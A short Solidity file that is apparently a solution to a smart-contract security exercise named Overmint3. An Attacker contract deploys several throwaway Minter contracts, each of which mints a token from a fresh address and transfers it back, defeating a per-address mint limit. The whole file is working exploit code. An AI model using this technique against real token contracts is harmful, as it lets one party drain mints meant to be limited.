// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Overmint3.sol";

contract Attacker {
    Overmint3 overmint;
    bool minted = false;

    constructor(address _overmint) {
        overmint = Overmint3(_overmint);
        overmint.mint();
        for (uint256 i = 2; i <= 5; i++) {
            new Minter(_overmint, i);
        }
    }
}

contract Minter {
    constructor(address token, uint256 id) {
        Overmint3(token).mint();
        Overmint3(token).transferFrom(address(this), msg.sender, id);
    }
}
